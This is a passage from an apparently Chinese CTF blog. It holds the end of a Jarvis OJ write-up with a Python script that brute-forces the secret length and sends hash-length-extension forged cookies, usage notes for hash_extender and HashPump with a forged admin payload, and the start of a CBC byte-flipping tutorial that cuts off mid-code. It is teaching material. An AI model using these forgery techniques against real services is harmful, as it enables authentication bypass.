json</span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">def gao(x, y):</span><br><span class="line">    <span class="comment">#print x</span></span><br><span class="line">    <span class="comment">#print y</span></span><br><span class="line">    url = <span class="string">"http://web.jarvisoj.com:32778/index.php"</span></span><br><span class="line">    cookie = <span class="string">"role="</span> + x + <span class="string">";hsh="</span> + y</span><br><span class="line">        <span class="comment">#print cookie</span></span><br><span class="line">    build_header = &#123;</span><br><span class="line">            <span class="string">'Cookie'</span>: cookie,</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">' Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0'</span>,</span><br><span class="line">            <span class="string">'Host'</span>: <span class="string">'web.jarvisoj.com:32778'</span>,</span><br><span class="line">            <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    urlparts = urlparse(url)</span><br><span class="line">    conn = HTTPConnection(urlparts.hostname, urlparts.port or 80)</span><br><span class="line">    conn.request(<span class="string">"GET"</span>, urlparts.path, <span class="string">''</span>, build_header)</span><br><span class="line">    resp = conn.getresponse()</span><br><span class="line">    body = resp.read()</span><br><span class="line">    <span class="built_in">return</span> body</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(1000):</span><br><span class="line">    <span class="built_in">print</span> i</span><br><span class="line">    <span class="comment"># secret len = ???</span></span><br><span class="line">    find_hash = <span class="string">"./hash_extender -d ';\"tseug\":5:s' -s 3a4727d57463f122833d9e732f94e4e0 -f md5  -a ';\"nimda\":5:s' --out-data-format=html -l "</span> + str(i) + <span class="string">" --quiet"</span></span><br><span class="line">    <span class="comment">#print find_hash</span></span><br><span class="line">    calc_res = os.popen(find_hash).readlines()</span><br><span class="line">    hash_value = calc_res[0][:32]</span><br><span class="line">    attack_padding = calc_res[0][32:]</span><br><span class="line">    attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-1])</span><br><span class="line">    ret = gao(attack_padding, hash_value)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Welcome"</span> <span class="keyword">in</span> ret:</span><br><span class="line">        <span class="built_in">print</span> ret</span><br><span class="line">        <span class="built_in">break</span></span><br></pre></td></tr></table></figure></p><p>将上述代码保存至 hash_extender.py<br>到 hash_extender 的目录下运行 python hash_extender.py 得到如下：</p><p><img src="3_3.png" alt></p><h1 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h1><h2 id="HashExtender和hashdump使用"><a href="#HashExtender和hashdump使用" class="headerlink" title="HashExtender和hashdump使用"></a>HashExtender和hashdump使用</h2><h3 id="HashExtender"><a href="#HashExtender" class="headerlink" title="HashExtender"></a>HashExtender</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Installing</span><br><span class="line">$ pip install HashExtender</span><br><span class="line"></span><br><span class="line">Usage</span><br><span class="line">&gt;&gt;&gt; import hashext</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> hashext.md5(data = <span class="string">'123'</span>, sign = <span class="string">'109889f941630d269546335f728f3558'</span>, length = 5, append = <span class="string">'test'</span>)</span><br><span class="line">(<span class="string">'123\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00test'</span>, <span class="string">'e5f78513e536615a6f5164ccff96d4d9'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ● data - your original signed message</span><br><span class="line">  ● sign - message signature, MD5(secret + msg)</span><br><span class="line">  ● length - probable length of secret string</span><br><span class="line">  ● append - data to append to new string</span><br></pre></td></tr></table></figure><p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Installing</span><br><span class="line"></span><br><span class="line">  1. git <span class="built_in">clone</span> https://github.com/iagox86/hash_extender  </span><br><span class="line">  2. <span class="built_in">cd</span> hash_extender  </span><br><span class="line">  3. make  </span><br><span class="line"></span><br><span class="line">useage</span><br><span class="line"></span><br><span class="line"> ./hash_extender &lt;--data=|--file=&gt; --signature= --format= [options]</span><br><span class="line"></span><br><span class="line">INPUT OPTIONS</span><br><span class="line">-d --data=</span><br><span class="line">      The original string that we<span class="string">'re going to extend.</span></span><br><span class="line"><span class="string">--data-format=</span></span><br><span class="line"><span class="string">      The format the string is being passed in as. Default: raw.</span></span><br><span class="line"><span class="string">      Valid formats: raw, hex, html, cstr</span></span><br><span class="line"><span class="string">--file=</span></span><br><span class="line"><span class="string">      As an alternative to specifying a string, this reads the original string</span></span><br><span class="line"><span class="string">      as a file.</span></span><br><span class="line"><span class="string">-s --signature=</span></span><br><span class="line"><span class="string">      The original signature.</span></span><br><span class="line"><span class="string">--signature-format=</span></span><br><span class="line"><span class="string">      The format the signature is being passed in as. Default: hex.</span></span><br><span class="line"><span class="string">      Valid formats: raw, hex, html, cstr</span></span><br><span class="line"><span class="string">-a --append=</span></span><br><span class="line"><span class="string">      The data to append to the string. Default: raw.</span></span><br><span class="line"><span class="string">--append-format=</span></span><br><span class="line"><span class="string">      Valid formats: raw, hex, html, cstr</span></span><br><span class="line"><span class="string">-f --format= [REQUIRED]</span></span><br><span class="line"><span class="string">      The hash_type of the signature. This can be given multiple times if you</span></span><br><span class="line"><span class="string">      want to try multiple signatures. '</span>all<span class="string">' will base the chosen types off</span></span><br><span class="line"><span class="string">      the size of the signature and use the hash(es) that make sense.</span></span><br><span class="line"><span class="string">      Valid types: md4, md5, ripemd160, sha, sha1, sha256, sha512, whirlpool</span></span><br><span class="line"><span class="string">-l --secret=</span></span><br><span class="line"><span class="string">      The length of the secret, if known. Default: 8.</span></span><br><span class="line"><span class="string">--secret-min=</span></span><br><span class="line"><span class="string">--secret-max=</span></span><br><span class="line"><span class="string">      Try different secret lengths (both options are required)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OUTPUT OPTIONS</span></span><br><span class="line"><span class="string">--table</span></span><br><span class="line"><span class="string">      Output the string in a table format.</span></span><br><span class="line"><span class="string">--out-data-format=</span></span><br><span class="line"><span class="string">      Output data format.</span></span><br><span class="line"><span class="string">      Valid formats: none, raw, hex, html, html-pure, cstr, cstr-pure, fancy</span></span><br><span class="line"><span class="string">--out-signature-format=</span></span><br><span class="line"><span class="string">      Output signature format.</span></span><br><span class="line"><span class="string">      Valid formats: none, raw, hex, html, html-pure, cstr, cstr-pure, fancy</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OTHER OPTIONS</span></span><br><span class="line"><span class="string">-h --help </span></span><br><span class="line"><span class="string">      Display the usage (this).</span></span><br><span class="line"><span class="string">--test</span></span><br><span class="line"><span class="string">      Run the test suite.</span></span><br><span class="line"><span class="string">-q --quiet</span></span><br><span class="line"><span class="string">      Only output what'</span>s absolutely necessary (the output string and the</span><br><span class="line">      signature)</span><br></pre></td></tr></table></figure></p><p>Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> ./hash_extender -f sha256 -l 9 -d <span class="string">';0:b'</span> -s feab615a09e9c09c1c79e806337bf73450786f1026ef88cf23a0c775b9c28391 -a <span class="string">';1:b'</span> --out-data-format=html  </span><br><span class="line"></span><br><span class="line">Type: sha256  </span><br><span class="line">Secret length: 9  </span><br><span class="line">New signature: 4cd85bfa32cfded3b01ed2a18af281c7dfd8118fdb3ce2d0d729f48fecbb1560  </span><br><span class="line">New string: %3b0%3ab%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00h%3b1%3ab</span><br></pre></td></tr></table></figure></p><p>-f 代表加密方式</p><p>-l key的长度</p><p>-s 原始的hash值</p><p>-a 添加的值</p><p>–out-data-format 输出的格式</p><h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Installing</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/bwall/HashPump</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line"><span class="built_in">cd</span> HashPump</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>至于想在python里实现hashpump，可以使用hashpumpy这个插件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install hashpumpy</span><br></pre></td></tr></table></figure></p><p>Usage<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hashpump</span></span><br><span class="line">Input Signature: 571580b26c65f306376d4f64e53cb5c7</span><br><span class="line">Input Data: admin</span><br><span class="line">Input Key Length: 20</span><br><span class="line">Input Data to Add: pcat</span><br></pre></td></tr></table></figure></p><p>或者直接<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d admin -k 20 -a pcat</span><br></pre></td></tr></table></figure></p><p>就会得到<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3e67e8f0c05e1ad68020df30bbc505f5</span><br><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00pcat</span><br></pre></td></tr></table></figure></p><p>第一个是新的签名，把它设置到cookies的getmein里。<br>第二个先把\x替换为%后，post提交<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00pcat</span><br></pre></td></tr></table></figure></p><h2 id="os-命令介绍"><a href="#os-命令介绍" class="headerlink" title="os 命令介绍"></a>os 命令介绍</h2><h3 id="os-popen"><a href="#os-popen" class="headerlink" title="os.popen"></a>os.popen</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">os.system(cmd) 的返回值只会有 0(成功),1,2</span><br><span class="line"></span><br><span class="line">os.popen(cmd) 会吧执行的 cmd 的输出作为值返回。</span><br><span class="line"></span><br><span class="line">os.popen() 可以实现一个“管道”，从这个命令获取的值可以继续被调用。而 os.system 不同，它只是调用，调用完后自身退出，可能返回个 0 吧</span><br><span class="line"></span><br><span class="line">比如，我想得到 ntpd 的进程 id，就要这么做：</span><br><span class="line"></span><br><span class="line">os.popen(<span class="string">'ps -C ntpd | grep -v CMD |awk '</span>&#123; <span class="built_in">print</span> <span class="variable">$1</span> &#125;<span class="string">').readlines()[0]</span></span><br></pre></td></tr></table></figure><h3 id="urlparse"><a href="#urlparse" class="headerlink" title="urlparse"></a>urlparse</h3><p>将urlstring解析成6个部分，它从urlstring中取得URL，并返回元组 (scheme, netloc, path, parameters, query, fragment)，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import urlparse</span><br><span class="line">&gt;&gt;&gt; url=urlparse.urlparse(<span class="string">'http://www.baidu.com/index.php?username=guol'</span>)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> url</span><br><span class="line">ParseResult(scheme=<span class="string">'http'</span>, netloc=<span class="string">'www.baidu.com'</span>, path=<span class="string">'/index.php'</span>, params=<span class="string">''</span>, query=<span class="string">'username=guol'</span>, fragment=<span class="string">''</span>)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> url.netloc</span><br><span class="line">www.baidu.com</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"></span><br><span class="line">urlparse.urlunparse(parts)</span><br><span class="line"></span><br><span class="line">    从一个元组构建一个url，元组类似urlparse返回的，它接收元组(scheme, netloc, path, parameters, query, fragment)后，会重新组成一个具有正确格式的URL，以便供Python的其他HTML解析模块使用。</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; import urlparse</span><br><span class="line">&gt;&gt;&gt; url=urlparse.urlparse(<span class="string">'http://www.baidu.com/index.php?username=guol'</span>)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> url</span><br><span class="line">ParseResult(scheme=<span class="string">'http'</span>, netloc=<span class="string">'www.baidu.com'</span>, path=<span class="string">'/index.php'</span>, params=<span class="string">''</span>, query=<span class="string">'username=guol'</span>, fragment=<span class="string">''</span>)</span><br><span class="line">&gt;&gt;&gt; u=urlparse.urlunparse(url)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> u</span><br><span class="line">http://www.baidu.com/index.php?username=guol</span><br></pre></td></tr></table></figure><p>Example：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from urlparse import urlparse</span><br><span class="line">url = <span class="string">"http://web.jarvisoj.com:32778/index.php"</span></span><br><span class="line">urlparts = urlparse(url)</span><br><span class="line"><span class="built_in">print</span> urlparts.hostname,urlparts.port,urlparts.scheme</span><br><span class="line"></span><br><span class="line">输出：web.jarvisoj.com 32778 http</span><br></pre></td></tr></table></figure></p><h2 id="HTTPConnection"><a href="#HTTPConnection" class="headerlink" title="HTTPConnection"></a>HTTPConnection</h2><h3 id="HTTPConnection创建对象"><a href="#HTTPConnection创建对象" class="headerlink" title="HTTPConnection创建对象"></a>HTTPConnection创建对象</h3><p>HTTPConnection(host[, port[, strict[, timeout]]])<br>host: 请求的服务器host，不能带http://开头<br>port: 服务器web服务端口<br>strict: 是否严格检查请求的状态行，就是http1.0/1.1 协议版本的那一行，即请求的第一行，默认为False，为True时检查错误会抛异常<br>timeout: 单次请求的超时时间，没有时默认使用httplib模块内的全局的超时时间</p><h3 id="HTTPConnection对象request方法："><a href="#HTTPConnection对象request方法：" class="headerlink" title="HTTPConnection对象request方法："></a>HTTPConnection对象request方法：</h3><p>说明：<br>发送一个请求</p><p>原型：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">conn.request(method, url[, body[, headers]])</span><br><span class="line">method: 请求的方式，如<span class="string">'GET'</span>,<span class="string">'POST'</span>,<span class="string">'HEAD'</span>,<span class="string">'PUT'</span>,<span class="string">'DELETE'</span>等</span><br><span class="line">url: 请求的网页路径。如：<span class="string">'/index.html'</span></span><br><span class="line">body: 请求是否带数据，该参数是一个字典</span><br><span class="line">headers: 请求是否带头信息，该参数是一个字典，不过键的名字是指定的http头关键字</span><br></pre></td></tr></table></figure></p><h3 id="HTTPConnection对象getresponse方法"><a href="#HTTPConnection对象getresponse方法" class="headerlink" title="HTTPConnection对象getresponse方法"></a>HTTPConnection对象getresponse方法</h3><p>说明：<br>获取一个http响应对象，相当于执行最后的2个回车</p><p>原型/实例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res = conn.getresponse()</span><br></pre></td></tr></table></figure></p><h3 id="HTTPResponse对象read方法"><a href="#HTTPResponse对象read方法" class="headerlink" title="HTTPResponse对象read方法"></a>HTTPResponse对象read方法</h3><p>说明：<br>获得http响应的内容部分，即网页源码</p><p>原型：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">body = res.read([amt])</span><br></pre></td></tr></table></figure></p><p>amt: 读取指定长度的字符，默认为空，即读取所有内容</p><p>实例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">body = res.read()  </span><br><span class="line">pbody = res.read(10)</span><br></pre></td></tr></table></figure></p><p>返回：<br>网页内容字符串</p><h3 id="conn-getheaders"><a href="#conn-getheaders" class="headerlink" title="conn.getheaders()"></a>conn.getheaders()</h3><p>说明：</p><p>获得http响应头</p><p>Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python    </span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-    </span></span><br><span class="line">import httplib  </span><br><span class="line">import urllib  </span><br><span class="line">  </span><br><span class="line">   </span><br><span class="line">def sendhttp():  </span><br><span class="line">    data = urllib.urlencode(&#123;<span class="string">'@number'</span>: 12524, <span class="string">'@type'</span>: <span class="string">'issue'</span>, <span class="string">'@action'</span>: <span class="string">'show'</span>&#125;)     </span><br><span class="line">    headers = &#123;<span class="string">"Content-type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,  </span><br><span class="line">               <span class="string">"Accept"</span>: <span class="string">"text/plain"</span>&#125;  </span><br><span class="line">    conn = httplib.HTTPConnection(<span class="string">'bugs.python.org'</span>)  </span><br><span class="line">    conn.request(<span class="string">'POST'</span>, <span class="string">'/'</span>, data, headers)  </span><br><span class="line">    httpres = conn.getresponse()  </span><br><span class="line">    <span class="built_in">print</span> httpres.status  </span><br><span class="line">    <span class="built_in">print</span> httpres.reason  </span><br><span class="line">    <span class="built_in">print</span> httpres.read()  </span><br><span class="line">             </span><br><span class="line">                </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:    </span><br><span class="line">    sendhttp()</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CBC字节翻转攻击</title>
      <link href="/2017/12/22/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"/>
      <url>/2017/12/22/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>CBC 字节翻转攻击原理和例题</p><a id="more"></a><h1 id="CBC-字节翻转攻击原理"><a href="#CBC-字节翻转攻击原理" class="headerlink" title="CBC 字节翻转攻击原理"></a>CBC 字节翻转攻击原理</h1><p>加密过程</p><p><img src="加密过程.png" alt></p><p>Plaintext：待加密的数据。</p><p>IV：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。</p><p>Key：被一些如 AES 的对称加密算法使用。</p><p>Ciphertext：加密后的数据。</p><p>在这里重要的一点是，CBC 工作于一个固定长度的比特组，将其称之为块。在本文中，我们将使用包含 16 字节的块。</p><p>因为作者讨厌高数（和译者一样），所以作者造了一些自己的公式（方便记忆）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">● Ciphertext-0 = Encrypt(Plaintext XOR IV)—只用于第一个组块</span><br><span class="line">● Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)—用于第二及剩下的组块</span><br></pre></td></tr></table></figure></p><p>注意：正如你所见，前一块的密文用来产生后一块的密文。</p><p><img src="加密过程1.png" alt></p><p>Decryption Process<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">● Plaintext-0 = Decrypt(Ciphertext) XOR IV—只用于第一个组块</span><br><span class="line">● Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1—用于第二及剩下的组块</span><br></pre></td></tr></table></figure></p><p>注意：Ciphertext-N-1（密文-N-1）是用来产生下一块明文；这就是字节翻转攻击开始发挥作用的地方。如果我们改变Ciphertext-N-1（密文-N-1）的一个字节，然后与下一个解密后的组块异或，我们就可以得到一个不同的明文了！You got it? 别担心，下面我们将看到一个详细的例子。与此同时，下面的这张图也可以很好地说明这种攻击：</p><p><img src="加密过程2.png" alt></p><h2 id="一个例子（CBC-Blocks-of-16-bytes）"><a href="#一个例子（CBC-Blocks-of-16-bytes）" class="headerlink" title="一个例子（CBC Blocks of 16 bytes）"></a>一个例子（CBC Blocks of 16 bytes）</h2><p>比方说，我们有这样的明文序列：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:4:<span class="string">"name"</span>;s:6:<span class="string">"sdsdsd"</span>;s:8:<span class="string">"greeting"</span>;s:20:<span class="string">"echo 'Hello sdsdsd!'"</span>;&#125;</span><br></pre></td></tr></table></figure></p><p>我们的目标是将 “s:6” 当中的数字6转换成数字 “7”。我们需要做的第一件事就是把明文分成 16 个字节的块：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">● Block 1:a:2:&#123;s:4:<span class="string">"name"</span>;</span><br><span class="line">● Block 2:s:6:<span class="string">"sdsdsd"</span>;s:8</span><br><span class="line">● Block 3::<span class="string">"greeting"</span>;s:20</span><br><span class="line">● Block 4::<span class="string">"echo 'Hello sd</span></span><br><span class="line"><span class="string">● Block 5:sdsd!'"</span>;&#125;</span><br></pre></td></tr></table></figure></p><p>因此，我们的目标字符位于块 2，这意味着我们需要改变块1的密文来改变第二块的明文。<br>有一条经验法则是（注：结合上面的说明图可以得到），你在密文中改变的字节，只会影响到在下一明文当中，具有相同偏移量的字节。所以我们目标的偏移量是2：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">● [0] = s</span><br><span class="line">● [1] = :</span><br><span class="line">● [2] = 6</span><br></pre></td></tr></table></figure></p><p>因此我们要改变在第一个密文块当中，偏移量是 2 的字节。正如你在下面的代码当中看到的，在第 2 行我们得到了整个数据的密文，然后在第 3 行中，我们改变块1中偏移量为 2 的字节，最后我们再调用解密函数。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="variable">$v</span> = <span class="string">"a:2:&#123;s:4:"</span>name<span class="string">";s:6:"</span>sdsdsd<span class="string">";s:8:"</span>greeting<span class="string">";s:20:"</span><span class="built_in">echo</span> <span class="string">'Hello sdsdsd!'</span><span class="string">";&#125;"</span>;</span><br><span class="line">2. <span class="variable">$enc</span> = @encrypt(<span class="variable">$v</span>);</span><br><span class="line">3. <span class="variable">$enc</span>[2] = chr(ord(<span class="variable">$enc</span>[2]) ^ ord(<span class="string">"6"</span>) ^ ord (<span class="string">"7"</span>));</span><br><span class="line">4. <span class="variable">$b</span> = @decrypt(<span class="variable">$enc</span>);</span><br></pre></td></tr></table></figure></p><p>运行这段代码后，我们可以将数字 6 变为 7：</p><p><img src="3.png" alt></p><p>但是我们在第 3 行中，是如何改变字节成为我们想要的值呢？</p><p>基于上述的解密过程，我们知道有，A = Decrypt(Ciphertext) 与 B = Ciphertext-N-1 异或后最终得到 C = 6。等价于：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C = A XOR B</span><br></pre></td></tr></table></figure></p><p>所以，我们唯一不知道的值就是 A（注：对于B，C来说）（block cipher decryption）;借由 XOR，我们可以很轻易地得到 A 的值：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A = B XOR C</span><br></pre></td></tr></table></figure></p><p>最后，A XOR B XOR C 等于 0。有了这个公式，我们可以在 XOR 运算的末尾处设置我们自己的值，就像这样：</p><p>A XOR B XOR C XOR “7”会在块 2 的明文当中，偏移量为 2 的字节处得到 7。</p><p>下面是相关原理实现的 PHP 源代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'MY_AES_KEY'</span>, <span class="string">"abcdef0123456789"</span>);</span><br><span class="line"><span class="keyword">function</span> aes(<span class="variable">$data</span>, <span class="variable">$encrypt</span>) &#123;</span><br><span class="line">    <span class="variable">$aes</span> = mcrypt_module_open(MCRYPT_RIJNDAEL_128, <span class="string">''</span>, MCRYPT_MODE_CBC, <span class="string">''</span>);</span><br><span class="line">    <span class="variable">$iv</span> = <span class="string">"1234567891234567"</span>;</span><br><span class="line">    mcrypt_generic_init(<span class="variable">$aes</span>, MY_AES_KEY, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$encrypt</span> ? mcrypt_generic(<span class="variable">$aes</span>,<span class="variable">$data</span>) : mdecrypt_generic(<span class="variable">$aes</span>,<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define(<span class="string">'MY_MAC_LEN'</span>, 40);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> encrypt(<span class="variable">$data</span>) &#123;</span><br><span class="line">    <span class="built_in">return</span> aes(<span class="variable">$data</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> decrypt(<span class="variable">$data</span>) &#123;</span><br><span class="line">    <span class="variable">$data</span> = rtrim(aes(<span class="variable">$data</span>, <span class="literal">false</span>), <span class="string">"\0"</span>);</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$v</span> = <span 